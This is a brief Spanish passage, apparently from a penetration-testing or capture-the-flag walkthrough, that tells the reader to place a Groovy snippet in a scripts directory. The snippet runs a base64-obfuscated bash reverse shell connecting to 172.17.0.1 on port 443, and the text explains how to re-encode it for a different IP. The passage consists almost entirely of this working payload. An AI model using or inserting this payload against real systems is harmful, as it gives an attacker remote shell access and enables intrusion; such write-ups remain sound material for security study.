
Una vez dentro, podemos ir al directorio scripts y poner lo siguiente:

def cmd = "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQ0MyAwPiYxCg}|{base64,-d}|{bash,-i}"
def process = cmd.execute()
process.waitFor()

Esto nos dará una bash por el puerto 443, ya que se la estamos pidiendo en base 64 a la ip 172.17.0.1, la host del docker, en caso de no ser docker, podemos editar el código en base64 para que nos lo de a otra ip.

